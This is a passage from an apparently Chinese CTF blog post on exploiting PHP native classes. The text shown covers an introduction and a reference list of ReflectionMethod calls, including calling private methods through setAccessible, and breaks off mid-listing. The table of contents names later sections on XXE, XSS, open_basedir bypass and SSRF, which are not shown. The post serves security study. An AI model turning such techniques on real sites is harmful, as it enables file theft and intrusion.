<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧\n0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通过这些类的调用，PHP 开发者可以轻松处理文件、数据库、网络请求、加密等多种任务，极大地提升了开发效率。\n所以说其实是有很多原生类的，包括算法\\压缩\\json\\xml\\图像等等，很多，大家可以自己去深入研究，这里的话只提及我们平时能够进行利用，达到任意文件读取\\ssrf等攻击手段的原生类\n原生类的利用 反射 ReflectionMethod 利用版本：(PHP 5, PHP 7)\nReflectionMethod 是 PHP 提供的反射类之一，用于获取类中某个具体方法的详细信息。\n常见方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # 反射调用方法 (new ReflectionMethod("class?","method?"))->invoke(new [class?]/NULL(静态类),args1,args2); (new ReflectionMethod("class?","method?"))->invokeArgs(new [class?]/NULL(静态类,[args1,args2])); # 设置私有/受保护方法 $f = new ReflectionMethod("class?","method?"); $f->setAccessible(true); $f->invoke(new [class?]); (new [class?])->[method?](); // 会报错 # 获取函数信息 (new ReflectionMethod("class?","method?"))->getDeclaringClass() // 获取反射方法的类作为反射类返回 (new ReflectionMethod("class?","method?"))->isAbstract() // 方法是否是抽象方法 (new ReflectionMethod("class?","method?"))->isConstructor() // 方法是否是 __construct (new ReflectionMethod("class?","method?"))->isDestructor() // 方法是否是 __destruct (new ReflectionMethod("class?","method?"))->isFinal() // 方法是否定义了final (new ReflectionMethod("class?","method?"))->isPrivate() // 方法是否是私有方法 (new ReflectionMethod("class?","method?"))->isProtected() // 方法是否是受保护方法 (new ReflectionMethod("class?","method?"))->isPublic() // 方法是否是公有方法 (new ReflectionMethod("class?","method?"))->isStatic() // 方法是否是静态方法 (new ReflectionMethod("class?","method?"))->getDocComment() // 获取方法注释内容 (new ReflectionMethod("class?","method?"))->getStartLine() // 获取方法开始行号 (new ReflectionMethod("class?","method?"))->getEndLine() // 获取方法结束行号 (new ReflectionMethod("class?","method?"))->getExtensionName() // 获取扩展名称 (new ReflectionMethod("class?","method?"))->getName() // 获取方法名称 (new ReflectionMethod("class?","method?"))->getNamespaceName() // 获取命名空间名称 (new ReflectionMethod("class?","method?"))->getNumberOfParameters() // 获取方法参数数量 (new ReflectionMethod("class?","method?"))->getNumberOfRequiredParameters() // 获取方法必须传入的参数数量 (new ReflectionMethod("class?","method?"))->getParameters() // 获取方法参数名 (new ReflectionMethod("class?","method?"))->getShortName() // 获取方法短名 (new ReflectionMethod("class?","method?"))->getStaticVariables() // 获取方法静态变量 (new ReflectionMethod("class?","method?"))->hasReturnType() // 方法是否有特定返回类型 (new ReflectionMethod("class?","method?"))->inNamespace() // 方法是否定义在命名空间 (new ReflectionMethod("class?","method?"))->isClosure() // 方法是否是匿名函数 (new ReflectionMethod("class?","method?"))->isDeprecated() // 方法是否弃用 (new ReflectionMethod("class?","method?"))->isGenerator() // 方法是否是生成器函数 (new ReflectionMethod("class?","method?"))->isInternal() // 方法是否是内部函数 (new ReflectionMethod("class?","method?"))->isUserDefined() // 方法是否是用户定义 [2021 CISCN]easy_source\n'><title>php原生类的利用</title><link rel=canonical href=https://baozongwi.xyz/p/php-native-class-exploitation/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="php原生类的利用"><meta property='og:description' content='0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧\n0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通过这些类的调用，PHP 开发者可以轻松处理文件、数据库、网络请求、加密等多种任务，极大地提升了开发效率。\n所以说其实是有很多原生类的，包括算法\\压缩\\json\\xml\\图像等等，很多，大家可以自己去深入研究，这里的话只提及我们平时能够进行利用，达到任意文件读取\\ssrf等攻击手段的原生类\n原生类的利用 反射 ReflectionMethod 利用版本：(PHP 5, PHP 7)\nReflectionMethod 是 PHP 提供的反射类之一，用于获取类中某个具体方法的详细信息。\n常见方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # 反射调用方法 (new ReflectionMethod("class?","method?"))->invoke(new [class?]/NULL(静态类),args1,args2); (new ReflectionMethod("class?","method?"))->invokeArgs(new [class?]/NULL(静态类,[args1,args2])); # 设置私有/受保护方法 $f = new ReflectionMethod("class?","method?"); $f->setAccessible(true); $f->invoke(new [class?]); (new [class?])->[method?](); // 会报错 # 获取函数信息 (new ReflectionMethod("class?","method?"))->getDeclaringClass() // 获取反射方法的类作为反射类返回 (new ReflectionMethod("class?","method?"))->isAbstract() // 方法是否是抽象方法 (new ReflectionMethod("class?","method?"))->isConstructor() // 方法是否是 __construct (new ReflectionMethod("class?","method?"))->isDestructor() // 方法是否是 __destruct (new ReflectionMethod("class?","method?"))->isFinal() // 方法是否定义了final (new ReflectionMethod("class?","method?"))->isPrivate() // 方法是否是私有方法 (new ReflectionMethod("class?","method?"))->isProtected() // 方法是否是受保护方法 (new ReflectionMethod("class?","method?"))->isPublic() // 方法是否是公有方法 (new ReflectionMethod("class?","method?"))->isStatic() // 方法是否是静态方法 (new ReflectionMethod("class?","method?"))->getDocComment() // 获取方法注释内容 (new ReflectionMethod("class?","method?"))->getStartLine() // 获取方法开始行号 (new ReflectionMethod("class?","method?"))->getEndLine() // 获取方法结束行号 (new ReflectionMethod("class?","method?"))->getExtensionName() // 获取扩展名称 (new ReflectionMethod("class?","method?"))->getName() // 获取方法名称 (new ReflectionMethod("class?","method?"))->getNamespaceName() // 获取命名空间名称 (new ReflectionMethod("class?","method?"))->getNumberOfParameters() // 获取方法参数数量 (new ReflectionMethod("class?","method?"))->getNumberOfRequiredParameters() // 获取方法必须传入的参数数量 (new ReflectionMethod("class?","method?"))->getParameters() // 获取方法参数名 (new ReflectionMethod("class?","method?"))->getShortName() // 获取方法短名 (new ReflectionMethod("class?","method?"))->getStaticVariables() // 获取方法静态变量 (new ReflectionMethod("class?","method?"))->hasReturnType() // 方法是否有特定返回类型 (new ReflectionMethod("class?","method?"))->inNamespace() // 方法是否定义在命名空间 (new ReflectionMethod("class?","method?"))->isClosure() // 方法是否是匿名函数 (new ReflectionMethod("class?","method?"))->isDeprecated() // 方法是否弃用 (new ReflectionMethod("class?","method?"))->isGenerator() // 方法是否是生成器函数 (new ReflectionMethod("class?","method?"))->isInternal() // 方法是否是内部函数 (new ReflectionMethod("class?","method?"))->isUserDefined() // 方法是否是用户定义 [2021 CISCN]easy_source\n'><meta property='og:url' content='https://baozongwi.xyz/p/php-native-class-exploitation/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='姿势'><meta property='article:published_time' content='2024-09-19T10:09:04+00:00'><meta property='article:modified_time' content='2024-09-19T10:09:04+00:00'><meta name=twitter:title content="php原生类的利用"><meta name=twitter:description content='0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧\n0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通过这些类的调用，PHP 开发者可以轻松处理文件、数据库、网络请求、加密等多种任务，极大地提升了开发效率。\n所以说其实是有很多原生类的，包括算法\\压缩\\json\\xml\\图像等等，很多，大家可以自己去深入研究，这里的话只提及我们平时能够进行利用，达到任意文件读取\\ssrf等攻击手段的原生类\n原生类的利用 反射 ReflectionMethod 利用版本：(PHP 5, PHP 7)\nReflectionMethod 是 PHP 提供的反射类之一，用于获取类中某个具体方法的详细信息。\n常见方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # 反射调用方法 (new ReflectionMethod("class?","method?"))->invoke(new [class?]/NULL(静态类),args1,args2); (new ReflectionMethod("class?","method?"))->invokeArgs(new [class?]/NULL(静态类,[args1,args2])); # 设置私有/受保护方法 $f = new ReflectionMethod("class?","method?"); $f->setAccessible(true); $f->invoke(new [class?]); (new [class?])->[method?](); // 会报错 # 获取函数信息 (new ReflectionMethod("class?","method?"))->getDeclaringClass() // 获取反射方法的类作为反射类返回 (new ReflectionMethod("class?","method?"))->isAbstract() // 方法是否是抽象方法 (new ReflectionMethod("class?","method?"))->isConstructor() // 方法是否是 __construct (new ReflectionMethod("class?","method?"))->isDestructor() // 方法是否是 __destruct (new ReflectionMethod("class?","method?"))->isFinal() // 方法是否定义了final (new ReflectionMethod("class?","method?"))->isPrivate() // 方法是否是私有方法 (new ReflectionMethod("class?","method?"))->isProtected() // 方法是否是受保护方法 (new ReflectionMethod("class?","method?"))->isPublic() // 方法是否是公有方法 (new ReflectionMethod("class?","method?"))->isStatic() // 方法是否是静态方法 (new ReflectionMethod("class?","method?"))->getDocComment() // 获取方法注释内容 (new ReflectionMethod("class?","method?"))->getStartLine() // 获取方法开始行号 (new ReflectionMethod("class?","method?"))->getEndLine() // 获取方法结束行号 (new ReflectionMethod("class?","method?"))->getExtensionName() // 获取扩展名称 (new ReflectionMethod("class?","method?"))->getName() // 获取方法名称 (new ReflectionMethod("class?","method?"))->getNamespaceName() // 获取命名空间名称 (new ReflectionMethod("class?","method?"))->getNumberOfParameters() // 获取方法参数数量 (new ReflectionMethod("class?","method?"))->getNumberOfRequiredParameters() // 获取方法必须传入的参数数量 (new ReflectionMethod("class?","method?"))->getParameters() // 获取方法参数名 (new ReflectionMethod("class?","method?"))->getShortName() // 获取方法短名 (new ReflectionMethod("class?","method?"))->getStaticVariables() // 获取方法静态变量 (new ReflectionMethod("class?","method?"))->hasReturnType() // 方法是否有特定返回类型 (new ReflectionMethod("class?","method?"))->inNamespace() // 方法是否定义在命名空间 (new ReflectionMethod("class?","method?"))->isClosure() // 方法是否是匿名函数 (new ReflectionMethod("class?","method?"))->isDeprecated() // 方法是否弃用 (new ReflectionMethod("class?","method?"))->isGenerator() // 方法是否是生成器函数 (new ReflectionMethod("class?","method?"))->isInternal() // 方法是否是内部函数 (new ReflectionMethod("class?","method?"))->isUserDefined() // 方法是否是用户定义 [2021 CISCN]easy_source\n'></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#了解原生类>了解原生类</a></li><li><a href=#原生类的利用>原生类的利用</a><ol><li><a href=#反射>反射</a><ol><li><a href=#reflectionmethod>ReflectionMethod</a></li><li><a href=#reflectionclass>ReflectionClass</a></li><li><a href=#reflectionfunctionabstract>ReflectionFunctionAbstract</a></li></ol></li><li><a href=#文件处理>文件处理</a><ol><li><a href=#ziparchive>ZipArchive</a></li><li><a href=#目录>目录</a></li><li><a href=#文件内容>文件内容</a></li><li><a href=#绕过open_basedir>绕过open_basedir</a></li></ol></li><li><a href=#xxe>xxe</a><ol><li><a href=#simplexmlelement>SimpleXMLElement</a></li></ol></li><li><a href=#xxs>xxs</a><ol><li><a href=#errorexception>Error/Exception</a></li></ol></li><li><a href=#绕过hash>绕过hash</a><ol><li><a href=#errorexception-1>Error/Exception</a></li></ol></li><li><a href=#ssrf>ssrf</a><ol><li><a href=#soapclient>SoapClient</a></li></ol></li></ol></li><li><a href=#利用时机>利用时机</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/php-native-class-exploitation/>php原生类的利用</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 19, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><h1 id=0x01-前言>0x01 前言</h1><p>在<code>base</code>和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧</p><h1 id=0x02-question>0x02 question</h1><h2 id=了解原生类>了解原生类</h2><blockquote><p>PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通过这些类的调用，PHP 开发者可以轻松处理文件、数据库、网络请求、加密等多种任务，极大地提升了开发效率。</p></blockquote><p>所以说其实是有很多原生类的，包括算法\压缩\json\xml\图像等等，很多，大家可以自己去深入研究，这里的话只提及我们平时能够进行利用，达到任意文件读取\ssrf等攻击手段的原生类</p><h2 id=原生类的利用>原生类的利用</h2><h3 id=反射>反射</h3><h4 id=reflectionmethod>ReflectionMethod</h4><p>利用版本：<code>(PHP 5, PHP 7)</code></p><p><code>ReflectionMethod</code> 是 PHP 提供的反射类之一，用于获取类中某个具体方法的详细信息。</p><p>常见方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># 反射调用方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=k>new</span> <span class=p>[</span><span class=nx>class</span><span class=o>?</span><span class=p>]</span><span class=o>/</span><span class=k>NULL</span><span class=p>(</span><span class=nx>静态类</span><span class=p>),</span><span class=nx>args1</span><span class=p>,</span><span class=nx>args2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>invokeArgs</span><span class=p>(</span><span class=k>new</span> <span class=p>[</span><span class=nx>class</span><span class=o>?</span><span class=p>]</span><span class=o>/</span><span class=k>NULL</span><span class=p>(</span><span class=nx>静态类</span><span class=p>,[</span><span class=nx>args1</span><span class=p>,</span><span class=nx>args2</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 设置私有/受保护方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$f</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span><span class=o>-&gt;</span><span class=na>setAccessible</span><span class=p>(</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=k>new</span> <span class=p>[</span><span class=nx>class</span><span class=o>?</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=k>new</span> <span class=p>[</span><span class=nx>class</span><span class=o>?</span><span class=p>])</span><span class=o>-&gt;</span><span class=p>[</span><span class=nx>method</span><span class=o>?</span><span class=p>]();</span> <span class=c1>// 会报错
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取函数信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getDeclaringClass</span><span class=p>()</span> <span class=c1>// 获取反射方法的类作为反射类返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isAbstract</span><span class=p>()</span> <span class=c1>// 方法是否是抽象方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isConstructor</span><span class=p>()</span> <span class=c1>// 方法是否是 __construct
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isDestructor</span><span class=p>()</span> <span class=c1>// 方法是否是 __destruct
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isFinal</span><span class=p>()</span> <span class=c1>// 方法是否定义了final
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isPrivate</span><span class=p>()</span> <span class=c1>// 方法是否是私有方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isProtected</span><span class=p>()</span> <span class=c1>// 方法是否是受保护方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isPublic</span><span class=p>()</span> <span class=c1>// 方法是否是公有方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isStatic</span><span class=p>()</span> <span class=c1>// 方法是否是静态方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getDocComment</span><span class=p>()</span> <span class=c1>// 获取方法注释内容
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStartLine</span><span class=p>()</span> <span class=c1>// 获取方法开始行号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getEndLine</span><span class=p>()</span> <span class=c1>// 获取方法结束行号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getExtensionName</span><span class=p>()</span> <span class=c1>// 获取扩展名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getName</span><span class=p>()</span> <span class=c1>// 获取方法名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getNamespaceName</span><span class=p>()</span> <span class=c1>// 获取命名空间名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getNumberOfParameters</span><span class=p>()</span> <span class=c1>// 获取方法参数数量
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getNumberOfRequiredParameters</span><span class=p>()</span> <span class=c1>// 获取方法必须传入的参数数量
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getParameters</span><span class=p>()</span> <span class=c1>// 获取方法参数名
